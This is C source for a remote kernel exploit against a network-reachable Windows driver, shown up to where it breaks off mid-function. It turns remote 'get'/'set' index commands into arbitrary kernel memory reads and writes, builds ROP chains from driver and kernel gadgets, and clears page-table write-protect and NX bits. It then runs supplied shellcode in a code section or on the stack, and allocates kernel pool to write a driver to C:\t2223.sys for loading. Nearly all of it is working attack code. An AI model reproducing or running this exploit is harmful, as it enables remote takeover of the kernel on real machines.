#include "target.h"
#define SIZE_IO_ROP_CHAIN  ((13) * 4)
#define SIZE_MAIN_ROP_CHAIN ((8) * 4)
// ############################################################### SOCKS

SOCKET ConnectToTarget(PCCH ip, USHORT port) {

	WSADATA wsData;
	SOCKET sock;
	SOCKADDR_IN sockaddr;

	if (WSAStartup(0x202, &wsData)) {
		printf("WSAStart error %d\n", WSAGetLastError());
		return INVALID_SOCKET;
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		printf("Socket() error %d\n", WSAGetLastError());
		WSACleanup();

		return INVALID_SOCKET;
	}

	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);
	sockaddr.sin_addr.S_un.S_addr = inet_addr(ip);

	if (connect(sock, (PSOCKADDR)&sockaddr, sizeof(sockaddr))) {
		printf("Connect error %d\n", WSAGetLastError());

		CloseSock(&sock);
		WSACleanup();
		return INVALID_SOCKET;
	}

	return sock;
}

ULONG RecvFromTarget(SOCKET sock, LPVOID buf, ULONG len) {
	if (len == 0) {
		return 0;
	}
	ULONG recvLen = recv(sock, (char*)buf, len, 0);
	if (recvLen == 0) {
		printf("Nothing recieved!\n");
		//return recvLen;
	}
	else if (recvLen == SOCKET_ERROR) {
		printf("Recv error %d\n", WSAGetLastError());
		return -1;
	}
	return recvLen;
}

BOOL SendToTarget(SOCKET sock, LPVOID data, ULONG len) {
	/*if (len == 0) {
		return TRUE;
	}*/
	if (send(sock, (const char*)data, len, 0) == SOCKET_ERROR) {
		printf("Error send %d\n", WSAGetLastError());
		return FALSE;
	}

	return TRUE;
}

void CloseAllSockets(PTARGET_SOCK socks) {
	if (socks->first != INVALID_SOCKET) closesocket(socks->first);
	if (socks->second != INVALID_SOCKET) closesocket(socks->second);
	for (int i = 0; i < MAXSOCKETVALUE; ++i) CloseSock(&socks->tmp[i]);
	WSACleanup();
}

void CloseMBSockets(PTARGET_SOCK socks) {
	for (int i = 0; i < MAXSOCKETVALUE; ++i) {
		CloseSock(&socks->tmp[i]);
	}
}

void CloseSock(SOCKET* sock) {
	if (*sock != INVALID_SOCKET) {
		closesocket(*sock);
		*sock = INVALID_SOCKET;
	}
}

BOOL CloseExploit(IN OUT PDRIVER_INFO info) {

    BOOL retValue = TRUE;
    PULONG ropChain = (PULONG)malloc(SIZE_IO_ROP_CHAIN + 16);
    //ULONG addrStartRop = worker->stacks.targetStack - 0x48;
    ULONG ropStub = 0x01010101;
    ULONG countStubs = (SIZE_IO_ROP_CHAIN / 4) - 2;
    int ropIndex = 0;

    if (!ropChain) {
        printf("[Srart mem] Error alloc mem\n");
        return FALSE;
    }

    ropChain[ropIndex++] = info->DriverBase + rva_CloseSocket;
    ropChain[ropIndex++] = info->leakSock;
    for (; ropIndex < countStubs; ++ropIndex) {
        ropChain[ropIndex] = ropStub;
    }

    if (!SendToTarget(info->socks.first, (LPVOID)&ropChain[0], SIZE_IO_ROP_CHAIN)) {
        printf("[Close mem] Error send rop\n");
        retValue = FALSE;
    }

    free(ropChain);
    return retValue;
}

// ############################################################### READ\WRITE

BOOL TargetWrite(IN SOCKET sock, IN int index, IN LPVOID lpData) {
    PCHAR buf;
    buf = (PCHAR)malloc(128);
    if (!buf) {
        printf("Error alloc mem\n");
        return FALSE;
    }
    RtlSecureZeroMemory(buf, 128);
    memcpy(buf, "set ", 4);
    _itoa_s((int)index, buf + 4, 15, 10);
    strcat(buf, "\n");
    if (!SendToTarget(sock, buf, strlen(buf))) {
        //CloseTarget(sock);
        free(buf);
        return FALSE;
    }
    if (!SendToTarget(sock, lpData, 4)) {
        //CloseTarget(sock);
        free(buf);
        return FALSE;
    }

    free(buf);
    return TRUE;
}

BOOL TargetRead(IN SOCKET sock, IN int index, OUT LPVOID lpData) {
    PCHAR buf;
    buf = (PCHAR)malloc(128);
    if (!buf) {
        printf("Error alloc mem\n");
        return FALSE;
    }
    RtlSecureZeroMemory(buf, 128);
    memcpy(buf, "get ", 4);
    _itoa_s((int)index, buf + 4, 15, 10);
    strcat(buf, "\n");
    if (!SendToTarget(sock, buf, strlen(buf))) {
        //CloseTarget(sock);
        free(buf);
        return FALSE;
    }
    if (RecvFromTarget(sock, lpData, 4) != 4) {
        //CloseTarget(sock);
        free(buf);
        return FALSE;
    }

    free(buf);
    return TRUE;
}

// ############################################################### ROP


BOOL InitROP(IN OUT PDRIVER_INFO info) {

	PULONG ropChain = NULL;
	ULONG someThing = 0x12345678;
	short iToLeakSock = 0, iToRetGetReq = 0;
    int ropIndex, stubEndIndex;
    ULONG addrStartRop = (info->stacks.first - 0x40) + 0x500;
    ULONG addrIOrop = addrStartRop - 0x1000;

	ropChain = (PULONG)malloc(0x1000);
	if (!ropChain) {
		return FALSE;
	}

	iToLeakSock = GET_INDEX_UP(info->stacks.second, info->stacks.between + (0x490 + 8));
	iToRetGetReq = GET_INDEX_UP(info->stacks.second, info->stacks.between - 0x4c);

	if ((!TargetRead(info->socks.second, iToLeakSock, &info->leakSock)) || !info->leakSock) {
		return FALSE;
	}

	printf("Leak socket\t\t0x%08X\n", info->leakSock);

    ropIndex = 0;
    ropChain[ropIndex] = info->DriverBase + gad_PopEbp;

    ropIndex = 3; // retn 8
    ropChain[ropIndex++] = addrStartRop - 8;

    ropChain[ropIndex++] = info->DriverBase + gad_MovEspEbp;

    stubEndIndex = ropIndex = (0x500 / 4);

    ropChain[ropIndex++] = info->DriverBase + gad_ret;
    ropChain[ropIndex++] = info->DriverBase + gad_ret;
    ropChain[ropIndex++] = info->DriverBase + gad_ret;

    // start ROP
    ropChain[ropIndex++] = info->DriverBase + gad_ret;
    ropChain[ropIndex++] = info->DriverBase + rva_Recv;
    ropChain[ropIndex++] = info->DriverBase + gad_PopEbp;       // retAddr 
    ropChain[ropIndex++] = info->leakSock;
    ropChain[ropIndex++] = addrIOrop;
    ropChain[ropIndex++] = SIZE_IO_ROP_CHAIN;
    ropChain[ropIndex++] = 0;
    ropChain[ropIndex++] = addrIOrop - 4;
    ropChain[ropIndex++] = info->DriverBase + gad_MovEspEbp;    // mov esp, ebp; ret

    printf("Receive ROP\t\t0x%08X\n", addrStartRop);
    printf("IO ROP\t\t\t0x%08X\n", addrIOrop);


    for (int i = 0; i < ropIndex; ++i) {
        if (i == 1 || i == 2 ||
            (i >= 5 && i < stubEndIndex)) {
            continue;
        }
        if (!TargetWrite(info->socks.second, iToRetGetReq + i, &ropChain[i])) {
            return FALSE;
        }
    }
    
    Sleep(1000);

    if (!SendToTarget(info->socks.first, (LPVOID)"\n", 1)) {
        return FALSE;
    }

    free(ropChain);

	return TRUE;
}

BOOL MemoryROP(IN PDRIVER_INFO info, IN MOP op, IN ULONG address, IN OUT LPVOID buffer, IN ULONG len) {

    ULONG addrStartRop, addrIOrop, ropIndex, mainRopIndex;
    PULONG ropChain = 0, mainROPChain = 0;

    ropChain = (PULONG)malloc(SIZE_IO_ROP_CHAIN + 16);
    mainROPChain = (PULONG)malloc(SIZE_MAIN_ROP_CHAIN + 16);
    if (!ropChain || !mainROPChain) {
        return FALSE;
    }

    addrStartRop = (info->stacks.first - 0x40) + 0x500;
    addrIOrop = addrStartRop - 0x1000;

    ropIndex = 0;

    // роп для восстановления контролирующей цепочки
    ropChain[ropIndex++] = info->DriverBase + rva_Recv;
    ropChain[ropIndex++] = op == READ ? info->DriverBase + rva_Send : info->DriverBase + rva_Recv;
    ropChain[ropIndex++] = info->leakSock;
    ropChain[ropIndex++] = addrStartRop;
    ropChain[ropIndex++] = SIZE_MAIN_ROP_CHAIN;
    ropChain[ropIndex++] = 0;

    // роп для чтения памяти
    ropChain[ropIndex++] = info->DriverBase + gad_PopEbp;
    ropChain[ropIndex++] = info->leakSock;
    ropChain[ropIndex++] = address;
    ropChain[ropIndex++] = len;
    ropChain[ropIndex++] = 0;
    ropChain[ropIndex++] = addrStartRop - 4;
    ropChain[ropIndex++] = info->DriverBase + gad_MovEspEbp;

    mainRopIndex = 0;
    mainROPChain[mainRopIndex++] = info->DriverBase + rva_Recv;
    mainROPChain[mainRopIndex++] = info->DriverBase + gad_PopEbp;
    mainROPChain[mainRopIndex++] = info->leakSock;
    mainROPChain[mainRopIndex++] = addrIOrop;
    mainROPChain[mainRopIndex++] = SIZE_IO_ROP_CHAIN;
    mainROPChain[mainRopIndex++] = 0;
    mainROPChain[mainRopIndex++] = addrIOrop - 4;
    mainROPChain[mainRopIndex++] = info->DriverBase + gad_MovEspEbp; // mov esp, ebp; ret


    // отправляем роп-цепочку 
    if (!SendToTarget(info->socks.first, (LPVOID)&ropChain[0], SIZE_IO_ROP_CHAIN)) {
        printf("Error send rop\n");
        free(ropChain);
        free(mainROPChain);
        return FALSE;
    }


    // восстанавливаем контролирующую роп-цепочку
    if (!SendToTarget(info->socks.first, (LPVOID)&mainROPChain[0], SIZE_MAIN_ROP_CHAIN)) {
        printf("Error send rop\n");
        free(ropChain);
        free(mainROPChain);
        return FALSE;
    }

    ;
    if (op == READ) {
        if (RecvFromTarget(info->socks.first, buffer, len) != len) {
            printf("Error read with rops\n");
            return FALSE;
        }
    }
    else {
        if (!SendToTarget(info->socks.first, buffer, len)) {
            printf("Error write with rops\n");
            return FALSE;
        }
    }

    //Sleep(500);
    free(ropChain);
    free(mainROPChain);
    return TRUE;
}

// ############################################################### PE

BOOL ParsePeImage(PBYTE mem, PeHeaders* pe) {


    pe->mem = mem;
    pe->doshead = (IMAGE_DOS_HEADER*)pe->mem;
    pe->nthead = (IMAGE_NT_HEADERS*)(pe->mem + pe->doshead->e_lfanew);
    pe->sections = (IMAGE_SECTION_HEADER*)((DWORD) & (pe->nthead->OptionalHeader) + pe->nthead->FileHeader.SizeOfOptionalHeader);
    pe->secCount = pe->nthead->FileHeader.NumberOfSections;

    // получаем инфомацию об экспорте
    if (pe->nthead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) {
        pe->expdir = (IMAGE_EXPORT_DIRECTORY*)
            (pe->mem + pe->nthead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        pe->expdirSize = pe->nthead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    }
    else {
        pe->expdir = 0;
        pe->expdirSize = 0;
    }

    // получаем информацию об импорте
    if (pe->nthead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress) {
        pe->impdir = (IMAGE_IMPORT_DESCRIPTOR*)
            (pe->mem + pe->nthead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        pe->impdirSize = pe->nthead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    }
    else {
        pe->impdir = 0;
        pe->impdirSize = 0;
    }

    return TRUE;
}

BOOL SearchAllNeededSection(PKERNEL_MODULE mod) {

    for (int i = 0; i < mod->pe.secCount; ++i) {
        PIMAGE_SECTION_HEADER section = &mod->pe.sections[i];
        if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            !(section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)) {

            mod->secCount++;
        }
    }

    mod->codeSections = (PIMAGE_SECTION_HEADER)malloc(sizeof(IMAGE_SECTION_HEADER) * mod->secCount);

    int j = 0;
    for (int i = 0; i < mod->pe.secCount; ++i) {
        PIMAGE_SECTION_HEADER section = &mod->pe.sections[i];
        if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            !(section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)) {

            if (mod->pe.nthead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress ==
                section->VirtualAddress) {

                mod->codeSections[j] = mod->pe.sections[i];
                mod->codeSections[j].VirtualAddress +=
                    mod->pe.nthead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;

                j++;
                continue;
            }
            mod->codeSections[j++] = mod->pe.sections[i];
        }
    }

    return TRUE;
}

BOOL LoadAllNeededSections(PKERNEL_MODULE mod, PDRIVER_INFO info) {

    for (int i = 0; i < mod->secCount; ++i) {
        if (!MemoryROP(info,
            READ,
            mod->base + mod->codeSections[i].VirtualAddress,
            mod->pe.mem + mod->codeSections[i].VirtualAddress,
            mod->codeSections[i].SizeOfRawData)) {

            return FALSE;
        }
    }

    return TRUE;
}

BOOL FindImageBaseByAddr(PDRIVER_INFO info, ULONG addr, LPVOID base) {
    ULONG tmpAddr = (addr - 0x1000) & 0xFFFFF000;

    ULONG value = 0;
    while (TRUE) {
        printf("\rSearch... 0x%08X ", tmpAddr);
        if (!MemoryROP(info,
            READ,
            tmpAddr,
            &value,
            4)) {

            *(PULONG)base = 0;
            return FALSE;
        }

        if ((value & 0x00FFFFFF) == 0x905a4d) { // MZ
            *(PULONG)base = tmpAddr;
            break;
        }

        tmpAddr -= 0x1000;
    }
    printf("\r                    \r");
    return TRUE;
}

BOOL LoadPeImage(PKERNEL_MODULE mod, PDRIVER_INFO info, ULONG base) {

    DWORD sizeOfImage;
    PBYTE tmpMem;

    tmpMem = (PBYTE)VirtualAlloc(NULL,
        0x1000,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);
    if (!tmpMem) {
        return FALSE;
    }
    if (!MemoryROP(info, READ, base, (LPVOID)tmpMem, 0x1000)) {
        VirtualFree(mod->pe.mem, 0, MEM_RELEASE);
        mod->pe.mem = NULL;
        return FALSE;
    }
    //mod->pe.doshead = (IMAGE_DOS_HEADER*)tmpMem;
    //mod->pe.nthead = (PIMAGE_NT_HEADERS32)(tmpMem + mod->pe.doshead->e_lfanew);
    sizeOfImage = ((PIMAGE_NT_HEADERS32)(tmpMem +
        ((PIMAGE_DOS_HEADER)(tmpMem))->e_lfanew))->OptionalHeader.SizeOfImage;
    mod->pe.mem = (PBYTE)VirtualAlloc(NULL,
        sizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);
    if (!mod->pe.mem) {
        return FALSE;
    }

    memcpy(mod->pe.mem, tmpMem, 0x1000);
    VirtualFree(tmpMem, 0, MEM_RELEASE);

    ParsePeImage(mod->pe.mem, &mod->pe);

    if (mod->pe.expdir) {
        if (!MemoryROP(
            info,
            READ,
            base + mod->pe.nthead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress,
            mod->pe.expdir,
            mod->pe.expdirSize)) {

            VirtualFree(mod->pe.mem, 0, MEM_RELEASE);
            mod->pe.mem = NULL;
            return FALSE;
        }
    }

    mod->base = base;
    mod->sizeOfImage = sizeOfImage;
    if (mod->pe.expdir) {
        mod->name = (const char*)(mod->pe.mem + mod->pe.expdir->Name);
    }
    else {
        mod->name = "None";
    }
    // IAT данные
    DWORD IATrva = mod->pe.nthead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress;
    mod->IATSize = mod->pe.nthead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
    if (!MemoryROP(info,
        READ,
        base + IATrva,
        mod->pe.mem + IATrva,
        mod->IATSize)) {

        VirtualFree(mod->pe.mem, 0, MEM_RELEASE);
        mod->pe.mem = NULL;
        return FALSE;
    }

    mod->IAT = (PULONG)((ULONG)mod->pe.mem + IATrva);

    // загружаем секции
    mod->secCount = 0;
    SearchAllNeededSection(mod);
    if (!LoadAllNeededSections(mod, info)) {
        VirtualFree(mod->pe.mem, 0, MEM_RELEASE);
        mod->pe.mem = NULL;
        return FALSE;
    }



    return TRUE;
}

ULONG FindExportByName(PeHeaders* pe, const char* name, ULONG base) {

    PWORD nameOrdinalsArray;
    PDWORD namesArray, functionsArray;
    DWORD i = 0;

    if (pe->expdir == 0 || pe->expdirSize == 0) {
        return 0;
    }

    functionsArray = (PDWORD)((ULONG)pe->mem + pe->expdir->AddressOfFunctions);
    namesArray = (PDWORD)((ULONG)pe->mem + pe->expdir->AddressOfNames);
    nameOrdinalsArray = (PWORD)((ULONG)pe->mem + pe->expdir->AddressOfNameOrdinals);

    for (i = 0; i < pe->expdir->NumberOfNames; i++) {
        if (!strcmp(name, (const char*)((ULONG)pe->mem + namesArray[i]))) {
            return base + functionsArray[nameOrdinalsArray[i]];
        }
    }

    return 0;
}

ULONG FindFreePlaceInSection(PKERNEL_MODULE module, ULONG neededLen) {

    ULONG addr = 0;

    for (int i = 0; i < module->secCount - 1; i++) {
        PIMAGE_SECTION_HEADER currSec = &module->codeSections[i];
        if ((module->codeSections[i + 1].VirtualAddress - (currSec->VirtualAddress + currSec->Misc.VirtualSize)) > neededLen) {
            addr = module->base + currSec->VirtualAddress + currSec->Misc.VirtualSize;
            break;
        }
    }

    return addr;
}

// ############################################################### ShellCode

BOOL ModPTE(PDRIVER_INFO info, PTE_FLAG bit, ULONG addr, ULONG size, BOOL disable) {

    SOCKET tmpSock = INVALID_SOCKET;
    ULONG targetPTE;
    PAEPTE4K pteContain;

    while ((int)size > 0) {
        targetPTE = (ULONG)(GET_PAE_PTE_ADDRESS_FROM_VA(addr));
        printf("\nModification PTE 0x%08X for 0x%08X\n", targetPTE, addr);

        if (!MemoryROP(info,
            READ,
            targetPTE,
            &pteContain,
            8)) {

            return FALSE;
        }

        printf("\tBefore:\tP = %d U/S = %d R/W = %d Nx = %d\n",
            pteContain.P, pteContain.U_S, pteContain.R_W, pteContain.Nx);

        if (disable) {
            switch (bit) {
            case RWbit:
                pteContain.R_W = 1;
                break;
            case NXbit:
                pteContain.Nx = 0;
                break;
            }
        }
        else {
            switch (bit) {
            case RWbit:
                pteContain.R_W = 0;
                break;
            case NXbit:
                pteContain.Nx = 1;
                break;
            }
        }

        if (!MemoryROP(info,
            WRITE,
            targetPTE,
            &pteContain,
            sizeof(PAEPTE4K))) {

            return FALSE;
        }
        if (!MemoryROP(info,
            READ,
            targetPTE,
            &pteContain,
            sizeof(PAEPTE4K))) {

            return FALSE;
        }
        printf("\tAfter:\tP = %d U/S = %d R/W = %d Nx = %d\n",
            pteContain.P, pteContain.U_S, pteContain.R_W, pteContain.Nx);

        addr += 0x1000;
        size -= 0x1000;
    }


    return TRUE;
}

BOOL ExecuteCodeSection(PDRIVER_INFO info, PBYTE sc, ULONG size, ULONG addrDst) {

    SOCKET sock = INVALID_SOCKET;
    ULONG leakSock = 0;
    ULONG leak = 0;

    if (!ModPTE(info, RWbit, addrDst, size + 12, TRUE)) {
        return FALSE;
    }

    if ((sock = ConnectToTarget(TARGETHOST, TARGETPORT)) == INVALID_SOCKET) {
        return FALSE;
    }

    if (!TargetRead(sock, -1, &leak)) {
        CloseSock(&sock);
        return FALSE;
    }

    leak = leak - 0x408 - 4;

    if (!MemoryROP(info, READ, leak + 0x490 + 8, &leakSock, 4)) {
        CloseSock(&sock);
        return FALSE;
    }

    *(PULONG)(&sc[size]) = leakSock;
    *(PULONG)(&sc[size + 4]) = info->DriverBase + rva_CloseSocket;
    *(PULONG)(&sc[size + 8]) = info->DriverBase + rva_Send;

    if (!MemoryROP(info,
        WRITE,
        addrDst,
        sc,
        size + 12)) {

        CloseSock(&sock);
        return FALSE;
    }

    if (!MemoryROP(info,
        WRITE,
        leak - 0x4c,
        &addrDst,
        4)) {

        CloseSock(&sock);
        return FALSE;
    }

    Sleep(10000);
    if (!SendToTarget(sock, (LPVOID)"\n", 1)) {
        CloseSock(&sock);
        return FALSE;
    }
    printf("Execute shellcode in code section!\n");
    CloseSock(&sock);
    return TRUE;
}

BOOL ExecuteStack(PDRIVER_INFO info, PBYTE sc, ULONG size) {

    SOCKET sock = INVALID_SOCKET;
    ULONG leak = 0,
        leakSock = 0,
        address = 0;

    if ((sock = ConnectToTarget(TARGETHOST, TARGETPORT)) == INVALID_SOCKET) {
        return FALSE;
    }

    if (!TargetRead(sock, -1, &leak)) {
        CloseSock(&sock);
        return FALSE;
    }

    leak = leak - 0x408 - 4;

    if (!MemoryROP(info, READ, leak + 0x490 + 8, &leakSock, 4)) {
        CloseSock(&sock);
        return FALSE;
    }

    address = leak - 0x40;

    if (!ModPTE(info, NXbit, address, size, TRUE)) {
        CloseSock(&sock);
        return FALSE;
    }

    *(PULONG)(&sc[size]) = leakSock;
    *(PULONG)(&sc[size + 4]) = info->DriverBase + rva_CloseSocket;
    *(PULONG)(&sc[size + 8]) = info->DriverBase + rva_Send;

    // write sc
    if (!MemoryROP(info,
        WRITE,
        address,
        sc,
        size + 12)) {

        CloseSock(&sock);
        return FALSE;
    }

    if (!MemoryROP(info,
        WRITE,
        leak - 0x4c,
        &address,
        4)) {

        CloseSock(&sock);
        return FALSE;
    }

    Sleep(10000);
    if (!SendToTarget(sock, (LPVOID)"\n", 1)) {

        CloseSock(&sock);
        return FALSE;
    }
    printf("Execute shellcode in stack!\n");
    CloseSock(&sock);
    return TRUE;
}

void ExecuteCode(PDRIVER_INFO info, PBYTE sc, ULONG size) {
    
    ULONG address = 0;

    if (!(address = FindFreePlaceInSection(&info->driver, size + 12))) {
        printf("Error find space in driver (%d bytes)\n", size);
        if (!(address = FindFreePlaceInSection(&info->kernel, size + 12))) {
            printf("Error find space in kernel (%d bytes)\n", size);
            return FALSE;
        }
    }
    if (info->versionOS == 7601) {
        //if (!ExecuteCodeSection(info, sc, size, info->DriverBase + 0x3164)) {
        if (!ExecuteCodeSection(info, sc, size, address)) {
            printf("Error execute sc in code section\n");
        }
    }

    if (!ExecuteStack(info, sc, size)) {
        printf("Error execute sc in stack\n");
    }
}

// ############################################################### Files

ULONG GetFileBytes(IN OUT PBYTE sc, IN LPCSTR filename) {

    HANDLE handle;
    BY_HANDLE_FILE_INFORMATION infofile;
    DWORD retLen = 0;

    if ((handle = CreateFileA(filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL)) == INVALID_HANDLE_VALUE) {

        printf("Error read %s\n", filename);
        return retLen;
    }
    
    if (!GetFileInformationByHandle(handle, &infofile)) {
        CloseHandle(handle);
        return retLen;
    }

    if (!ReadFile(handle,
        sc,
        infofile.nFileSizeLow,
        &retLen,
        NULL)) {

        CloseHandle(handle);
        return retLen;
    }

    CloseHandle(handle);
    return retLen;
}

// ############################################################### Driver

BOOL InitFuns(PDRIVER_INFO info) {

    info->fun.ExAllocatePool = FindExportByName(&info->kernel.pe, "ExAllocatePool", info->KernelBase);
    info->fun.ExFreePool = FindExportByName(&info->kernel.pe, "ExFreePool", info->KernelBase);
    info->fun.RtlCreateRegistryKey = FindExportByName(&info->kernel.pe, "RtlCreateRegistryKey", info->KernelBase);
    info->fun.RtlWriteRegistryValue = FindExportByName(&info->kernel.pe, "RtlWriteRegistryValue", info->KernelBase);
    info->fun.ZwClose = FindExportByName(&info->kernel.pe, "ZwClose", info->KernelBase);
    info->fun.ZwCreateFile = FindExportByName(&info->kernel.pe, "ZwCreateFile", info->KernelBase);
    info->fun.ZwLoadDriver = FindExportByName(&info->kernel.pe, "ZwLoadDriver", info->KernelBase);
    info->fun.ZwWriteFile = FindExportByName(&info->kernel.pe, "ZwWriteFile", info->KernelBase);

    if (!info->fun.ExAllocatePool ||
        !info->fun.ExFreePool ||
        !info->fun.RtlCreateRegistryKey ||
        !info->fun.RtlWriteRegistryValue ||
        !info->fun.ZwClose ||
        !info->fun.ZwCreateFile ||
        !info->fun.ZwLoadDriver ||
        !info->fun.ZwWriteFile) {
        return FALSE;
    }

    printf("\nInit functions\n\
            \tExAllocatePool\t\t0x%08X\n\
            \tExFreePool\t\t0x%08X\n\
            \tRtlCreateRegistryKey\t0x%08X\n\
            \tRtlWriteRegistryValue\t0x%08X\n\
            \tZwClose\t\t\t0x%08X\n\
            \tZwCreateFile\t\t0x%08X\n\
            \tZwLoadDriver\t\t0x%08X\n\
            \tZwWriteFile\t\t0x%08X\n",
        info->fun.ExAllocatePool, info->fun.ExFreePool,
        info->fun.RtlCreateRegistryKey, info->fun.RtlWriteRegistryValue,
        info->fun.ZwClose, info->fun.ZwCreateFile, 
        info->fun.ZwLoadDriver, info->fun.ZwWriteFile);

    return TRUE;
}

BOOL WriteDriver(PDRIVER_INFO info, PBYTE driver, ULONG size,
    PULONG address, SOCKET* sock, PULONG addressLocal) {

    SOCKET allocSock = INVALID_SOCKET;
    ULONG allocStack = 0,
        saveStack = 0,
        leakAllocSock = 0,
        localAddrForSave = 0,
        index = 0;
    PULONG ropChain = 0;

    // alloc
    if ((allocSock = ConnectToTarget(TARGETHOST, TARGETPORT)) == INVALID_SOCKET) {
        return FALSE;
    }
    if (!TargetRead(allocSock, -1, &allocStack)) {
        CloseSock(&allocSock);
        return FALSE;
    }
    allocStack = allocStack - 0x408 -4;
    if (!MemoryROP(info, READ, allocStack + 0x498, &leakAllocSock, 4)) {
        CloseSock(&allocSock);
        return FALSE;
    }

    // save
    if ((*sock = ConnectToTarget(TARGETHOST, TARGETPORT)) == INVALID_SOCKET) {
        CloseSock(&allocSock);
        return FALSE;
    }
    if (!TargetRead(*sock, -1, &saveStack)) {
        CloseSock(&allocSock);
        CloseSock(sock);
        return FALSE;
    }
    saveStack = saveStack - 0x408 - 4;

    localAddrForSave = saveStack - 0x40;
    
    // alloc rop
    ropChain = (PULONG)malloc(64);
    if (!ropChain) return FALSE;

    ropChain[index++] = info->fun.ExAllocatePool;
    index++;
    index++;
    if (info->versionOS == 7601) ropChain[index++] = info->KernelBase + gad_popEcx7;
    else ropChain[index++] = info->KernelBase + gad_popEcx; // pop ecx; ret;
    ropChain[index++] = 1;
    ropChain[index++] = size;
    ropChain[index++] = localAddrForSave;
    if (info->versionOS == 7601) ropChain[index++] = info->KernelBase + gad_movMemEcxEax7;
    else ropChain[index++] = info->KernelBase + gad_movMemEcxEax; // mov [ecx], eax; ret;


    for (; index < 8; ++index) {
        ropChain[index] = 0x01010101;
    }

    ropChain[index++] = info->DriverBase + rva_CloseSocket;

    for (; index < 9; ++index) {
        ropChain[index] = 0x01010101;
    }

    ropChain[index++] = leakAllocSock;

    if (!MemoryROP(info, WRITE, allocStack - 0x4c, ropChain, index * 4)) {
        CloseSock(&allocSock);
        CloseSock(sock);
        free(ropChain);
        return FALSE;
    }
    free(ropChain);

    Sleep(10000);
    // exec
    CloseSock(&allocSock);

    if (!MemoryROP(info, READ, localAddrForSave, address, 4)) {
        CloseSock(sock);
        return FALSE;
    }

    if (!(*address)) {
        CloseSock(sock);
        return FALSE;
    }
    if (!MemoryROP(info, WRITE, *address, driver, size)) {
        CloseSock(sock);
        return FALSE;
    }
    *addressLocal = localAddrForSave;
    return TRUE;
}

BOOL CreateFileDriver(PDRIVER_INFO info, ULONG address, ULONG addressForSave, ULONG size) {

    SOCKET tmpSock = INVALID_SOCKET;
    ULONG leakStack, leakSock;
    ULONG handle;
    UNICODE_STRING drPath = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };

    PULONG ropChain = (PULONG)malloc(256);
    ULONG ropIndex = 0, sizeRopWords = 0;
    ULONG ropStub = 0x01010101;
    ULONG countWordsToWriteFile = 0;

    if ((tmpSock = ConnectToTarget(TARGETHOST, TARGETPORT)) == INVALID_SOCKET) { return FALSE; }
    if (!TargetRead(tmpSock, -1, &leakStack)) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    leakStack = leakStack - 0x408 - 4;
    printf("\nSave driver (C:\\t2223.sys) on disk...\n");
    ULONG addrStartRop = leakStack - 0x4c;
    ULONG addtStartSave = addressForSave;
    BYTE zero[64] = { 0, };

    if (!MemoryROP(info,
        READ,
        leakStack + 0x498,
        &leakSock,
        4)) {

        CloseSock(&tmpSock);
        return FALSE;
    }

    WCHAR path[] = L"\\??\\C:\\t2223.sys";

    ULONG addrPath = addressForSave;
    if (!MemoryROP(info,
        WRITE,
        addrPath,
        &path,
        sizeof(path))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addressForSave += sizeof(path);

    RtlInitUnicodeString((PUNICODE_STRING)&drPath, (PWCHAR)&path);
    drPath.Buffer = (PWSTR)addrPath;
    ULONG addrUSpath = addressForSave;
    if (!MemoryROP(info,
        WRITE,
        addrUSpath,
        &drPath,
        sizeof(UNICODE_STRING))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addressForSave += sizeof(UNICODE_STRING);

    ULONG addrOA = addressForSave;
    InitializeObjectAttributes(&oa, (PUNICODE_STRING)addrUSpath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    if (!MemoryROP(info,
        WRITE,
        addrOA,
        &oa,
        sizeof(OBJECT_ATTRIBUTES))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addressForSave += sizeof(OBJECT_ATTRIBUTES);

    ULONG addrHandle = addressForSave;
    addressForSave += 4;

    ULONG addrIOsb = addressForSave;
    if (!MemoryROP(info,
        WRITE,
        addrIOsb,
        &zero,
        sizeof(IO_STATUS_BLOCK))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addressForSave += sizeof(IO_STATUS_BLOCK);

    ULONG addrBytesOffset = addressForSave;
    if (!MemoryROP(info,
        WRITE,
        addrBytesOffset,
        &zero,
        sizeof(LARGE_INTEGER))) {

        CloseSock(&tmpSock);
        return FALSE;
    }
    addressForSave += sizeof(LARGE_INTEGER);
    
    ropChain[ropIndex++] = info->fun.ZwCreateFile;
    ropChain[ropIndex++] = ropStub;
    ropChain[ropIndex++] = ropStub;

    // frame ZwCreateFile
    if (info->versionOS == 7601) ropChain[ropIndex++] = info->KernelBase + gad_popEax7;
    else ropChain[ropIndex++] = info->KernelBase + gad_popEax; // 0x27094
    ropChain[ropIndex++] = addrHandle;
    ropChain[ropIndex++] = FILE_WRITE_DATA;
